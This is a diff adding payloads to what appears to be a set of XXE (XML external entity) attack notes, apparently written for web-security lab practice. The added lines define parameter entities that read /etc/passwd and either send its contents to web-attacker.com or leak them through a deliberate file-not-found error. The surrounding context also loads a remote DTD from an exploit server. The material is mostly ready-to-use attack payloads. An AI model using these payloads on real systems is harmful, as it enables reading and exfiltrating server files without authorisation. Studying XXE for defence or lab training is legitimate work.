@@ -20,6 +20,11 @@
 %eval; <!-- calls eval to create exfiltrate -->
 %exfiltrate; <!-- calls exfiltrate -->
 
+<!ENTITY % file SYSTEM "file:///etc/passwd"> 
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
+%eval; 
+%exfiltrate;
+
 <!-- xxe to call for dtd to be downloaded -->
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a590060036c3abf822f84b101970034.exploit-server.net/exploit.dtd"> %xxe; ]>
 
@@ -29,6 +34,11 @@
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistant/%file;'>"> <!-- Eval parameter containing the creation of the error parameter which makes a request to a fake url causing an error -->
 %eval; <!-- calls eval to create exfiltrate -->
 %error; <!-- calls error -->
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistant/%file;'>"> 
+%eval; 
+%error; 
 
 <!-- XXE via Xinclude
         - Xinclude allows XML document to be built from subdocuments
